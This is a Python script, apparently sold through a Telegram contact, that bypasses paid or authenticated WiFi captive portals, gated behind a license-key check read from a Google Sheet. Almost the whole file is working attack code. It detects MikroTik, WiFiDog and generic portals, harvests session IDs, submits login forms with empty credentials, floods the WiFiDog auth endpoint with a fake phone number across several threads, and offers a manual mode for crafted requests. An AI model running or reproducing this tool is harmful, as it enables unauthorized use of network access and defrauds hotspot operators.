#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turbo Network Engine v3 – Ultimate Fallback Edition
MikroTik, WiFiDog, Generic Portals, Manual Mode
All previous functions + extra detection layers
"""
import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
import socket
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM (unchanged)
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM (original)
# ===============================
SHEET_ID = "1SfizOga-9kZKvgcDvTMr6NLuZyq9J2PbLruRMaOYX44"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key:
                        keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except:
                    pass
            return keys
    except:
        pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except:
        pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    print(f"{white}[*] System Key: {system_key}{reset}")
    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
    if system_key in authorized_keys:
        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
        print(f"║                    Turbo Engine Unlocked                            ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                  ║")
        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
        print(f"║                                                                  ║")
        print(f"║     {bcyan}📱 Telegram:{reset}  @Zeldris                                      ║")
        print(f"║     {bcyan}📢 Channel:{reset}  t.me/zelwithz                                 ║")
        print(f"║                                                                  ║")
        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
        print(f"║                                                                  ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# BANNER DISPLAY (unchanged)
# ===============================
def display_banner():
    banner_text = f"""
{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
{bred}┃                                                ┃{reset}
{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃                                                ┃{reset}
{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
"""
    print(banner_text)
    time.sleep(1.5)

# ===============================
# AUTO INSTALLER (unchanged)
# ===============================
def auto_install_dependencies():
    required_packages = ['requests', 'urllib3']
    missing_packages = []
    print(f"{bcyan}[*] Checking dependencies...{reset}")
    for package in required_packages:
        if importlib.util.find_spec(package) is None:
            missing_packages.append(package)
    if missing_packages:
        print(f"{yellow}[!] Missing packages: {', '.join(missing_packages)}{reset}")
        print(f"{bcyan}[*] Installing dependencies...{reset}")
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
                print(f"{green}[✓] Installed: {package}{reset}")
            except Exception as e:
                print(f"{red}[X] Failed to install {package}: {e}{reset}")
        print(f"{green}[✓] All dependencies installed!{reset}")
        time.sleep(1)
    else:
        print(f"{green}[✓] All dependencies already installed!{reset}")
        time.sleep(0.5)

# ===============================
# GLOBAL CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False
stop_event = threading.Event()

def check_real_internet():
    """Robust internet check with socket timeout"""
    try:
        socket.setdefaulttimeout(3)
        return requests.get("http://www.google.com", timeout=(3, 3)).status_code == 200
    except:
        return False

# ===============================
# PORTAL DETECTION & CLASSIFICATION
# ===============================
def get_portal_url():
    """Try multiple methods to detect captive portal URL"""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=True, timeout=5)
        if r.url != "http://connectivitycheck.gstatic.com/generate_204":
            return r.url
    except:
        pass
    try:
        r = requests.get("http://captive.apple.com/hotspot-detect.html",
                         allow_redirects=True, timeout=5)
        if r.url != "http://captive.apple.com/hotspot-detect.html":
            return r.url
    except:
        pass
    try:
        r = requests.get("http://www.msftconnecttest.com/redirect",
                         allow_redirects=True, timeout=5)
        if "msftconnecttest" not in r.url:
            return r.url
    except:
        pass
    return None

def detect_portal_type(html, url):
    """Return 'mikrotik', 'wifidog', or 'generic'"""
    if re.search(r'(mikrotik|hotspot\.login|/login\b)', html, re.IGNORECASE) or '/login' in url.lower():
        return 'mikrotik'
    if re.search(r'wifidog|gw_address|gw_port', html, re.IGNORECASE):
        return 'wifidog'
    return 'generic'

def extract_session_id(url, html):
    """Try to extract session ID from URL or HTML"""
    # URL query
    qs = parse_qs(urlparse(url).query)
    sid = qs.get('sessionId', [None])[0] or qs.get('id', [None])[0]
    if sid:
        return sid
    # HTML patterns
    match = re.search(r'sessionId=([a-zA-Z0-9]+)', html)
    if match:
        return match.group(1)
    match = re.search(r'"sid":"([^"]+)"', html)
    if match:
        return match.group(1)
    match = re.search(r'name="sessionid"\s+value="([^"]+)"', html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None

# ===============================
# MIKROTIK AUTH
# ===============================
def mikrotik_auth(session, portal_url, sid):
    """Post login to MikroTik hotspot"""
    try:
        print(f"{cyan}[*] MikroTik hotspot detected – attempting form login...{reset}")
        r = session.get(portal_url, verify=False, timeout=10)
        # Find form action
        action_match = re.search(r'action="([^"]+)"', r.text, re.IGNORECASE)
        action = urljoin(portal_url, action_match.group(1)) if action_match else urljoin(portal_url, '/login')
        # Collect hidden fields
        data = {}
        for inp in re.findall(r'<input[^>]+>', r.text, re.IGNORECASE):
            name_m = re.search(r'name="([^"]+)"', inp)
            val_m = re.search(r'value="([^"]*)"', inp)
            if name_m:
                data[name_m.group(1)] = val_m.group(1) if val_m else ""
        # Ensure essential fields
        data.setdefault('dst', '')
        data.setdefault('username', '')
        data.setdefault('password', '')
        # Insert session ID
        if 'id' in data:
            data['id'] = sid
        elif 'sid' in data:
            data['sid'] = sid
        else:
            data['id'] = sid
        print(f"{green}[✓]{reset} Posting to {action} with data: {data}")
        resp = session.post(action, data=data, verify=False, timeout=10)
        if resp.status_code in (200, 302, 303):
            time.sleep(2)
            if check_real_internet():
                print(f"{bgreen}[✓] MikroTik login successful!{reset}")
                return True
        print(f"{yellow}[!] Login POST sent, but not yet online.{reset}")
        return False
    except Exception as e:
        print(f"{red}[X] MikroTik auth error: {e}{reset}")
        return False

# ===============================
# WIFIDOG AUTH (original ping method)
# ===============================
def wifidog_auth(session, portal_url, sid, gw_addr, gw_port):
    """Launch high‑speed ping threads for WiFiDog bypass"""
    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
    print(f"{purple}[*] WiFiDog mode – launching {PING_THREADS} turbo threads...{reset}")
    print(f"{cyan}[*] Auth link: {auth_link}{reset}")
    def ping_worker():
        ping_count = 0
        success_count = 0
        while not stop_event.is_set():
            try:
                start = time.time()
                r = session.get(auth_link, timeout=5)
                elapsed = (time.time() - start) * 1000
                ping_count += 1
                success_count += 1
                col = green if elapsed < 50 else (yellow if elapsed < 100 else red)
                print(f"{col}[✓]{reset} SID {sid[:8]} | {elapsed:.1f}ms | {success_count}/{ping_count}", end="\r")
            except Exception as e:
                ping_count += 1
                print(f"{red}[X]{reset} SID {sid[:8]} | Failed | {success_count}/{ping_count}", end="\r")
            time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
    threads = []
    for _ in range(PING_THREADS):
        t = threading.Thread(target=ping_worker, daemon=True)
        t.start()
        threads.append(t)
    # Monitor connectivity
    last_status = False
    while not stop_event.is_set():
        is_conn = check_real_internet()
        if is_conn and not last_status:
            print(f"\n{green}[✓] Internet Connected!{reset}")
        elif not is_conn and last_status:
            print(f"\n{red}[X] Internet Disconnected! Reconnecting...{reset}")
        last_status = is_conn
        time.sleep(2)

# ===============================
# GENERIC BYPASS (multi‑method)
# ===============================
def generic_bypass(session, portal_url):
    """Try multiple strategies for generic portals: button click, JS redirect, form submit"""
    print(f"{yellow}[*] Generic portal detected – attempting auto‑bypass...{reset}")
    try:
        r = session.get(portal_url, timeout=10)
        html = r.text
        base = portal_url

        # Strategy 1: Look for "Connect" / "Agree" / "Login" button or link
        # Pattern: <a href="..." ...>Connect</a> or <button>Connect</button>
        link_patterns = [
            r'href="([^"]+)"[^>]*>\s*(?:Connect|Agree|Login|Accept|Continue|I Agree|I Accept)\s*<',
            r'href="([^"]+)"[^>]*>\s*(?:connect|agree|login|accept|continue)\s*<'
        ]
        for pat in link_patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                link = urljoin(base, match.group(1))
                print(f"{green}[✓]{reset} Found action link: {link}")
                session.get(link, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True

        # Strategy 2: Look for a form with submit button
        forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
        for form_html in forms:
            action_match = re.search(r'action="([^"]+)"', form_html, re.IGNORECASE)
            action = urljoin(base, action_match.group(1)) if action_match else base
            inputs = re.findall(r'<input[^>]+>', form_html, re.IGNORECASE)
            data = {}
            for inp in inputs:
                name_m = re.search(r'name="([^"]+)"', inp)
                val_m = re.search(r'value="([^"]*)"', inp)
                if name_m:
                    data[name_m.group(1)] = val_m.group(1) if val_m else ""
            # Check if it has a promising submit
            submit_label = re.search(r'<input[^>]*type="submit"[^>]*value="([^"]+)"', form_html, re.IGNORECASE)
            if not submit_label:
                submit_label = re.search(r'<button[^>]*type="submit"[^>]*>(.*?)</button>', form_html, re.IGNORECASE)
            if submit_label and any(k in submit_label.group(1).lower() for k in ["connect", "agree", "login", "accept", "continue", "ok"]):
                print(f"{green}[✓]{reset} Submitting form to {action}")
                session.post(action, data=data, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True

        # Strategy 3: Follow JavaScript redirection (location.href = ...)
        js_redirect = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
        if js_redirect:
            next_url = urljoin(base, js_redirect.group(1))
            print(f"{green}[✓]{reset} Following JS redirect to {next_url}")
            session.get(next_url, timeout=10)
            time.sleep(2)
            if check_real_internet():
                return True

        # Strategy 4: Just GET the original URL again (some portals need a second request)
        session.get(portal_url, timeout=10)
        time.sleep(2)
        return check_real_internet()
    except Exception as e:
        print(f"{red}[X] Generic bypass error: {e}{reset}")
        return False

# ===============================
# MANUAL MODE
# ===============================
def manual_mode():
    """Let user manually input authentication URL and parameters"""
    print(f"\n{bcyan}[*] Manual Bypass Mode{reset}")
    print(f"{yellow}You can enter a custom URL to trigger authentication.{reset}")
    url = input(f"{bcyan}[?]{reset} Auth URL: ").strip()
    if not url:
        print(f"{red}[!] No URL provided. Aborting.{reset}")
        return
    method = input(f"{bcyan}[?]{reset} Method (GET/POST, default GET): ").strip().upper() or "GET"
    params = {}
    print(f"{yellow}Enter POST/GET data (key=value), empty line to finish.{reset}")
    while True:
        line = input(f"{bcyan}[?]{reset} key=value: ").strip()
        if not line:
            break
        if '=' in line:
            k, v = line.split('=', 1)
            params[k.strip()] = v.strip()
    session = requests.Session()
    try:
        if method == 'POST':
            resp = session.post(url, data=params, timeout=10)
        else:
            resp = session.get(url, params=params, timeout=10)
        print(f"{green}[✓]{reset} Response: {resp.status_code}")
        time.sleep(2)
        if check_real_internet():
            print(f"{bgreen}[✓] Internet is now active!{reset}")
        else:
            print(f"{yellow}[!] No internet yet – portal may need additional steps.{reset}")
    except Exception as e:
        print(f"{red}[X] Manual request failed: {e}{reset}")

# ===============================
# TURBO ENGINE MAIN LOOP
# ===============================
def start_turbo_engine():
    stop_event.clear()  # Reset from previous run
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    TURBO NETWORK ENGINE v3                          ║")
    print(f"║                    Ultimate Fallback Edition                        ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")
    print(f"\n{cyan}[*] Network Status:{reset}")
    if check_real_internet():
        print(f"    {green}[✓] Internet is already active{reset}")
        print(f"{yellow}[!] No action needed. Returning to menu...{reset}")
        time.sleep(2)
        return

    print(f"\n{cyan}[*] Detecting captive portal...{reset}")
    portal_url = get_portal_url()
    if not portal_url:
        print(f"{red}[!] No portal detected. You may already be online or using a VPN.{reset}")
        return

    print(f"{green}[✓]{reset} Portal found: {portal_url}")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    # Fetch portal page for analysis
    try:
        r = session.get(portal_url, verify=False, timeout=10)
        html = r.text
    except Exception as e:
        print(f"{red}[X] Could not load portal page: {e}{reset}")
        return

    ptype = detect_portal_type(html, portal_url)
    print(f"{bcyan}[*] Portal type: {ptype.upper()}{reset}")

    sid = extract_session_id(portal_url, html)
    if sid:
        print(f"{green}[✓]{reset} Session ID: {sid}")
    else:
        print(f"{yellow}[!] No session ID found – may not be needed.{reset}")

    if ptype == 'mikrotik':
        mikrotik_auth(session, portal_url, sid)
    elif ptype == 'wifidog':
        # Extract gw_address / gw_port if available
        parsed = urlparse(portal_url)
        qs = parse_qs(parsed.query)
        gw_addr = qs.get('gw_address', ['192.168.60.1'])[0]
        gw_port = qs.get('gw_port', ['2060'])[0]
        wifidog_auth(session, portal_url, sid, gw_addr, gw_port)
    else:
        generic_bypass(session, portal_url)

    # Final monitoring after bypass attempt
    print(f"\n{yellow}[*] Monitoring connection (Ctrl+C to stop)...{reset}")
    try:
        while not stop_event.is_set():
            if not check_real_internet():
                print(f"{red}[X] Connection lost! Restarting detection...{reset}")
                break
            time.sleep(5)
    except KeyboardInterrupt:
        pass

# ===============================
# MENU SYSTEM
# ===============================
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"""
{bcyan}╔══════════════════════════════════════════════════════════════════╗
║                         MAIN MENU v3                                  ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║     {bgreen}[1]{reset} {cyan}Start Turbo Engine{reset} (Auto Bypass)                                 ║
║     {bgreen}[2]{reset} {cyan}Manual Bypass{reset} (Custom URL & Params)                             ║
║     {bred}[3]{reset} {cyan}Exit{reset}                                                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    while True:
        try:
            choice = input(f"{bcyan}[?]{reset} Select option [1-3]: ").strip()
            if choice == '1':
                return 'auto'
            elif choice == '2':
                return 'manual'
            elif choice == '3':
                return 'exit'
            else:
                print(f"{red}[!] Invalid option! Please choose 1, 2 or 3{reset}")
        except KeyboardInterrupt:
            return 'exit'

# ===============================
# MAIN ENTRY POINT
# ===============================
def main():
    if not check_approval():
        sys.exit(1)
    print(f"\n{bcyan}[*] Running auto-installer...{reset}")
    auto_install_dependencies()
    while True:
        choice = show_menu()
        if choice == 'auto':
            try:
                start_turbo_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}Engine stopped. Press Enter...{reset}")
                input()
                continue
        elif choice == 'manual':
            manual_mode()
            input(f"\n{yellow}Press Enter to return to menu...{reset}")
            continue
        elif choice == 'exit':
            print(f"\n{green}[✓] Thank you for using Turbo Network Engine v3!{reset}")
            print(f"{cyan}Visit: t.me/Zeldris for updates{reset}\n")
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
        print(f"{yellow}Send this key to @Zeldris to purchase{reset}")
        sys.exit(0)
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Program terminated by user{reset}")
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal Error: {e}{reset}")
        sys.exit(1)